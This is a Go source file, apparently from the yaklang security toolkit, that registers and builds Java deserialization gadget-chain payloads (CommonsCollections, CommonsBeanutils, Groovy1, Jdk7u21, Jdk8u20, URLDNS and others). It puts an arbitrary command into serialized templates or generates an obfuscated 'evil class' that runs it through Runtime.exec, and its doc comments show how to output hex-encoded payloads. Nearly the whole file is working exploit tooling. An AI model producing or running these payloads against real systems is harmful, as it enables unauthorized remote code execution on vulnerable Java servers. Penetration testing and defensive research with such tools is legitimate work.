package yso

import (
	"fmt"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yserx"
	"reflect"
)

const (
	BeanShell1GadgetName              = "BeanShell1"
	CommonsCollections1GadgetName     = "CommonsCollections1"
	CommonsCollections5GadgetName     = "CommonsCollections5"
	CommonsCollections6GadgetName     = "CommonsCollections6"
	CommonsCollections7GadgetName     = "CommonsCollections7"
	CommonsCollectionsK3GadgetName    = "CommonsCollectionsK3"
	CommonsCollectionsK4GadgetName    = "CommonsCollectionsK4"
	Groovy1GadgetName                 = "Groovy1"
	Click1GadgetName                  = "Click1"
	CommonsBeanutils1GadgetName       = "CommonsBeanutils1"
	CommonsBeanutils183NOCCGadgetName = "CommonsBeanutils183NOCC"
	CommonsBeanutils192NOCCGadgetName = "CommonsBeanutils192NOCC"
	CommonsCollections2GadgetName     = "CommonsCollections2"
	CommonsCollections3GadgetName     = "CommonsCollections3"
	CommonsCollections4GadgetName     = "CommonsCollections4"
	CommonsCollections8GadgetName     = "CommonsCollections8"
	CommonsCollectionsK1GadgetName    = "CommonsCollectionsK1"
	CommonsCollectionsK2GadgetName    = "CommonsCollectionsK2"
	JBossInterceptors1GadgetName      = "JBossInterceptors1"
	JSON1GadgetName                   = "JSON1"
	JavassistWeld1GadgetName          = "JavassistWeld1"
	Jdk7u21GadgetName                 = "Jdk7u21"
	Jdk8u20GadgetName                 = "Jdk8u20"
	URLDNS                            = "URLDNS"
	FindGadgetByDNS                   = "FindGadgetByDNS"
	FindClassByBomb                   = "FindClassByBomb"
)

type GadgetInfo struct {
	Name            string
	GeneratorName   string
	Generator       any
	NameVerbose     string
	Help            string
	YakFun          string
	SupportTemplate bool
}

func (g *GadgetInfo) GetNameVerbose() string {
	return g.NameVerbose
}
func (g *GadgetInfo) GetName() string {
	return g.Name
}
func (g *GadgetInfo) GetHelp() string {
	return g.Help
}
func (g *GadgetInfo) IsSupportTemplate() bool {
	return g.SupportTemplate
}

var AllGadgets = map[string]*GadgetInfo{
	//BeanShell1GadgetName:              {Name: BeanShell1GadgetName, NameVerbose: "BeanShell1", Help: "", SupportTemplate: false},
	//Click1GadgetName:                  {Name: Click1GadgetName, NameVerbose: "Click1", Help: "", SupportTemplate: true},
	//CommonsBeanutils1GadgetName:       {Name: CommonsBeanutils1GadgetName, NameVerbose: "CommonsBeanutils1", Help: "", SupportTemplate: true},
	//CommonsBeanutils183NOCCGadgetName: {Name: CommonsBeanutils183NOCCGadgetName, NameVerbose: "CommonsBeanutils183NOCC", Help: "uses String.CASE_INSENSITIVE_ORDER as the comparator, removing the dependency on the cc chain.", SupportTemplate: true},
	//CommonsBeanutils192NOCCGadgetName: {Name: CommonsBeanutils192NOCCGadgetName, NameVerbose: "CommonsBeanutils192NOCC", Help: "uses String.CASE_INSENSITIVE_ORDER as the comparator, removing the dependency on the cc chain.", SupportTemplate: true},
	//CommonsCollections1GadgetName:     {Name: CommonsCollections1GadgetName, NameVerbose: "CommonsCollections1", Help: "", SupportTemplate: false},
	//CommonsCollections2GadgetName:     {Name: CommonsCollections2GadgetName, NameVerbose: "CommonsCollections2", Help: "", SupportTemplate: true},
	//CommonsCollections3GadgetName:     {Name: CommonsCollections3GadgetName, NameVerbose: "CommonsCollections3", Help: "", SupportTemplate: true},
	//CommonsCollections4GadgetName:     {Name: CommonsCollections4GadgetName, NameVerbose: "CommonsCollections4", Help: "", SupportTemplate: true},
	//CommonsCollections5GadgetName:     {Name: CommonsCollections5GadgetName, NameVerbose: "CommonsCollections5", Help: "", SupportTemplate: false},
	//CommonsCollections6GadgetName:     {Name: CommonsCollections6GadgetName, NameVerbose: "CommonsCollections6", Help: "", SupportTemplate: false},
	//CommonsCollections7GadgetName:     {Name: CommonsCollections7GadgetName, NameVerbose: "CommonsCollections7", Help: "", SupportTemplate: false},
	//CommonsCollections8GadgetName:     {Name: CommonsCollections8GadgetName, NameVerbose: "CommonsCollections8", Help: "", SupportTemplate: true},
	//CommonsCollectionsK1GadgetName:    {Name: CommonsCollectionsK1GadgetName, NameVerbose: "CommonsCollectionsK1", Help: "", SupportTemplate: true},
	//CommonsCollectionsK2GadgetName:    {Name: CommonsCollectionsK2GadgetName, NameVerbose: "CommonsCollectionsK2", Help: "", SupportTemplate: true},
	//CommonsCollectionsK3GadgetName:    {Name: CommonsCollectionsK3GadgetName, NameVerbose: "CommonsCollectionsK3", Help: "", SupportTemplate: false},
	//CommonsCollectionsK4GadgetName:    {Name: CommonsCollectionsK4GadgetName, NameVerbose: "CommonsCollectionsK4", Help: "", SupportTemplate: false},
	//Groovy1GadgetName:                 {Name: Groovy1GadgetName, NameVerbose: "Groovy1", Help: "", SupportTemplate: false},
	//JBossInterceptors1GadgetName:      {Name: JBossInterceptors1GadgetName, NameVerbose: "JBossInterceptors1", Help: "", SupportTemplate: true},
	//JSON1GadgetName:                   {Name: JSON1GadgetName, NameVerbose: "JSON1", Help: "", SupportTemplate: true},
	//JavassistWeld1GadgetName:          {Name: JavassistWeld1GadgetName, NameVerbose: "JavassistWeld1", Help: "", SupportTemplate: true},
	//Jdk7u21GadgetName:                 {Name: Jdk7u21GadgetName, NameVerbose: "Jdk7u21", Help: "", SupportTemplate: true},
	//Jdk8u20GadgetName:                 {Name: Jdk8u20GadgetName, NameVerbose: "Jdk8u20", Help: "", SupportTemplate: true},
	//URLDNS:                            {Name: URLDNS, NameVerbose: URLDNS, Help: "triggers dnslog through URL object", SupportTemplate: false},
	//FindGadgetByDNS:                   {Name: FindGadgetByDNS, NameVerbose: FindGadgetByDNS, Help: "detects the class through the URLLDNS gadget, and then determines the gadget.", SupportTemplate: false},
}

func init() {
	RegisterGadget(GetBeanShell1JavaObject, BeanShell1GadgetName, "BeanShell1", "")
	RegisterGadget(GetClick1JavaObject, Click1GadgetName, "Click1", "")
	RegisterGadget(GetCommonsBeanutils1JavaObject, CommonsBeanutils1GadgetName, "CommonsBeanutils1", "")
	RegisterGadget(GetCommonsBeanutils183NOCCJavaObject, CommonsBeanutils183NOCCGadgetName, "CommonsBeanutils183NOCC", "")
	RegisterGadget(GetCommonsBeanutils192NOCCJavaObject, CommonsBeanutils192NOCCGadgetName, "CommonsBeanutils192NOCC", "")
	RegisterGadget(GetCommonsCollections1JavaObject, CommonsCollections1GadgetName, "CommonsCollections1", "")
	RegisterGadget(GetCommonsCollections2JavaObject, CommonsCollections2GadgetName, "CommonsCollections2", "")
	RegisterGadget(GetCommonsCollections3JavaObject, CommonsCollections3GadgetName, "CommonsCollections3", "")
	RegisterGadget(GetCommonsCollections4JavaObject, CommonsCollections4GadgetName, "CommonsCollections4", "")
	RegisterGadget(GetCommonsCollections5JavaObject, CommonsCollections5GadgetName, "CommonsCollections5", "")
	RegisterGadget(GetCommonsCollections6JavaObject, CommonsCollections6GadgetName, "CommonsCollections6", "")
	RegisterGadget(GetCommonsCollections7JavaObject, CommonsCollections7GadgetName, "CommonsCollections7", "")
	RegisterGadget(GetCommonsCollections8JavaObject, CommonsCollections8GadgetName, "CommonsCollections8", "")
	RegisterGadget(GetCommonsCollectionsK1JavaObject, CommonsCollectionsK1GadgetName, "CommonsCollectionsK1", "")
	RegisterGadget(GetCommonsCollectionsK2JavaObject, CommonsCollectionsK2GadgetName, "CommonsCollectionsK2", "")
	RegisterGadget(GetCommonsCollectionsK3JavaObject, CommonsCollectionsK3GadgetName, "CommonsCollectionsK3", "")
	RegisterGadget(GetCommonsCollectionsK4JavaObject, CommonsCollectionsK4GadgetName, "CommonsCollectionsK4", "")
	RegisterGadget(GetGroovy1JavaObject, Groovy1GadgetName, "Groovy1", "")
	RegisterGadget(GetJBossInterceptors1JavaObject, JBossInterceptors1GadgetName, "JBossInterceptors1", "")
	RegisterGadget(GetJSON1JavaObject, JSON1GadgetName, "JSON1", "")
	RegisterGadget(GetJavassistWeld1JavaObject, JavassistWeld1GadgetName, "JavassistWeld1", "")
	RegisterGadget(GetJdk7u21JavaObject, Jdk7u21GadgetName, "Jdk7u21", "")
	RegisterGadget(GetJdk8u20JavaObject, Jdk8u20GadgetName, "Jdk8u20", "")
	RegisterGadget(GetURLDNSJavaObject, URLDNS, URLDNS, "")
	RegisterGadget(GetFindGadgetByDNSJavaObject, FindGadgetByDNS, FindGadgetByDNS, "")
}
func RegisterGadget(f any, name string, verbose string, help string) {
	var supportTemplate = false
	funType := reflect.TypeOf(f)
	if funType.IsVariadic() && funType.NumIn() == 1 && funType.In(0).Kind() == reflect.Slice && funType.Kind() == reflect.Func {
		supportTemplate = true
	} else {
		if funType.NumIn() > 0 && funType.In(0).Kind() == reflect.String && funType.Kind() == reflect.Func {
			supportTemplate = false
		} else {
			panic("gadget function must be func(options ...GenClassOptionFun) (*JavaObject, error) or func(cmd string) (*JavaObject, error)")
		}
	}
	AllGadgets[name] = &GadgetInfo{
		Name:            name,
		NameVerbose:     verbose,
		Generator:       f,
		GeneratorName:   name,
		Help:            help,
		SupportTemplate: supportTemplate,
		YakFun:          fmt.Sprintf("Get%sJavaObject", name),
	}
}

type JavaObject struct {
	yserx.JavaSerializable
	verbose *GadgetInfo
}

func (a *JavaObject) Verbose() *GadgetInfo {
	return a.verbose
}

var verboseWrapper = func(y yserx.JavaSerializable, verbose *GadgetInfo) *JavaObject {
	return &JavaObject{
		y,
		verbose,
	}
}

type TemplatesGadget func(options ...GenClassOptionFun) (*JavaObject, error)
type RuntimeExecGadget func(cmd string) (*JavaObject, error)

func ConfigJavaObject(templ []byte, name string, options ...GenClassOptionFun) (*JavaObject, error) {
	config := NewClassConfig(options...)
	if config.ClassType == "" {
		config.ClassType = RuntimeExecClass
	}
	classObj, err := config.GenerateClassObject()
	if err != nil {
		return nil, err
	}
	objs, err := yserx.ParseJavaSerialized(templ)
	if err != nil {
		return nil, err
	}
	obj := objs[0]
	err = SetJavaObjectClass(obj, classObj)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, AllGadgets[name]), nil
}
func setCommandForRuntimeExecGadget(templ []byte, name string, cmd string) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(templ)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	err = ReplaceStringInJavaSerilizable(obj, "whoami", cmd, 1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, AllGadgets[name]), nil
}

// GetJavaObjectFromBytes Parses and returns the first Java object from a byte array.
// This function uses the ParseJavaSerialized method to parse the provided byte sequence.
// and expect at least a valid Java object to be parsed out.
// function will return an error. If the parsing is successful, it returns the first Java object parsed.
// byt: The byte array to be parsed.
// returns: the first Java object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// raw := "rO0..." // base64 Java serialized object
// bytes = codec.DecodeBase64(raw)~ // base64 decoding
// javaObject, err := yso.GetJavaObjectFromBytes(bytes) // parses the Java object from the bytes.
// ```
func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(byt)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	return verboseWrapper(obj, &GadgetInfo{}), nil
}

// GetBeanShell1JavaObject generates and returns a Java object based on the BeanShell1 serialization template.
// It first parses the predefined BeanShell1 serialization template, and then replaces the preset placeholder with the incoming command string in the first Java object parsed.
// cmd: The command string to be passed into the Java object.
// returns: the modified Java object and nil error are returned on success, and nil and corresponding error are returned on failure.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, err := yso.GetBeanShell1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(template_ser_BeanShell1)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	err = ReplaceStringInJavaSerilizable(obj, "whoami1", cmd, 1)
	if err != nil {
		return nil, err
	}
	//err = ReplaceStringInJavaSerilizable(obj, `"whoami1"`, cmd, 1)
	//if err != nil {
	//	return nil, err
	//}
	return verboseWrapper(obj, AllGadgets["BeanShell1"]), nil
}

// GetCommonsCollections1JavaObject generates and returns a Java object based on the Commons Collections 3.1 serialization template.
// This function accepts a command string as argument and sets the command in the generated Java object.
// cmd: the command string to be set in the Java object.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, err := yso.GetCommonsCollections1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections1, "CommonsCollections1", cmd)
}

// GetCommonsCollections5JavaObject Generates and returns a Java object based on the Commons Collections 2 serialization template.
// This function accepts a command string as argument and sets the command in the generated Java object.
// cmd: the command string to be set in the Java object.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections5, "CommonsCollections5", cmd)
}

// GetCommonsCollections6JavaObject generates and returns a Java object based on the Commons Collections 6 serialization template.
// This function accepts a command string as argument and sets the command in the generated Java object.
// cmd: the command string to be set in the Java object.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections6, "CommonsCollections6", cmd)
}

// GetCommonsCollections7JavaObject is based on the Commons Collections 7 sequence. The template generates and returns a Java object.
// This function accepts a command string as argument and sets the command in the generated Java object.
// cmd: the command string to be set in the Java object.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections7, "CommonsCollections7", cmd)
}

// GetCommonsCollectionsK3JavaObject generates and returns a Java object based on the Commons Collections K3 serialization template.
// This function accepts a command string as argument and sets the command in the generated Java object.
// cmd: the command string to be set in the Java object.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK3, "CommonsCollectionsK3", cmd)
}

// GetCommonsCollectionsK4JavaObject Generates and returns a Java object based on the Commons Collections K4 serialized template.
// This function accepts a command string as argument and sets the command in the generated Java object.
// cmd: the command string to be set in the Java object.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK4, "CommonsCollectionsK4", cmd)
}

// GetGroovy1JavaObject generates and returns a Java object based on the Groovy1 serialization template.
// This function accepts a command string as argument and sets the command in the generated Java object.
// cmd: the command string to be set in the Java object.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command := "ls" // Hypothetical command string
// javaObject, _ = yso.GetGroovy1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_Groovy1, "Groovy1", cmd)
}

// GetClick1JavaObject generates and returns a Java object based on the Click1 serialization template.
// Users can provide additional configuration via variadic options , which are specified using functions of type GenClassOptionFun.
// These functions allow the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetClick1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command),
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className),
//	)
//
// ```
func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Click1, "Click1", options...)
}

// GetCommonsBeanutils1JavaObject generates and returns a Java object based on the Commons Beanutils 1 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(
//
//	 yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//		yso.obfuscationClassConstantPool(),
//		yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils1, "CommonsBeanutils1", options...)
}

// GetCommonsBeanutils183NOCCJavaObject generates and returns a Java object based on the Commons Beanutils 1.8.3 serialization template.
// removes dependency on commons-collections:3.1 if parsing fails or results are empty.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils183NOCC, "CommonsBeanutils183NOCC", options...)
}

// GetCommonsBeanutils192NOCCJavaObject generates and returns a Java object based on the Commons Beanutils 1.9.2 serialization template.
// removes dependency on commons-collections:3.1 if parsing fails or results are empty.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils192NOCC, "CommonsBeanutils192NOCC", options...)
}

// GetCommonsCollections2JavaObject generates and returns a Java object based on the Commons Collections 4.0 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections2, "CommonsCollections2", options...)
}

// GetCommonsCollections3JavaObject generates and returns a Java object based on the Commons Collections 3.1 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections3JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections3, "CommonsCollections3", options...)
}

// GetCommonsCollections4JavaObject generates and returns a Java object based on the Commons Collections 4.0 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections4JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections4, "CommonsCollections4", options...)
}

// GetCommonsCollections8JavaObject generates and returns a Java object based on the Commons Collections 4.0 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections8JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections8, "CommonsCollections8", options...)
}

// GetCommonsCollectionsK1JavaObject Based on Commons Collections <=3.2.1 The serialization template generates and returns a Java object.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollectionsK1, "CommonsCollectionsK1", options...)
}

// GetCommonsCollectionsK2JavaObject Generates and returns a Java object based on the Commons Collections 4.0 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollectionsK2, "CommonsCollectionsK2", options...)
}

// GetJBossInterceptors1JavaObject generates and returns a Java object based on the JBossInterceptors1 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJBossInterceptors1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_JBossInterceptors1, "JBossInterceptors1", options...)
}

// GetJSON1JavaObject generates and returns a Java object based on the JSON1 serialization template. The
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJSON1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_JSON1, "JSON1", options...)
}

// GetJavassistWeld1JavaObject generates and returns a Java object based on the JavassistWeld1 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJavassistWeld1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	//objs, err := yserx.ParseJavaSerialized(template_ser_JavassistWeld1)
	//if err != nil {
	//	return nil, err
	//}
	//obj := objs[0]
	//return verboseWrapper(obj, AllGadgets["JavassistWeld1"]), nil

	return ConfigJavaObject(template_ser_JavassistWeld1, "JavassistWeld1", options...)
}

// GetJdk7u21JavaObject generates and returns a Java object based on the Jdk7u21 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJdk7u21JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Jdk7u21, "Jdk7u21", options...)
}

// GetJdk8u20JavaObject Generates and returns a Java object based on the Jdk8u20 serialization template.
// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
// These functions enable the user to customize specific properties or behavior of the generated Java objects.
// options: A list of variable parameter functions used to configure Java objects.
// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJdk8u20JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // Specifies the name of the malicious class
//
// )
// ```
func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Jdk8u20, "Jdk8u20", options...)
}

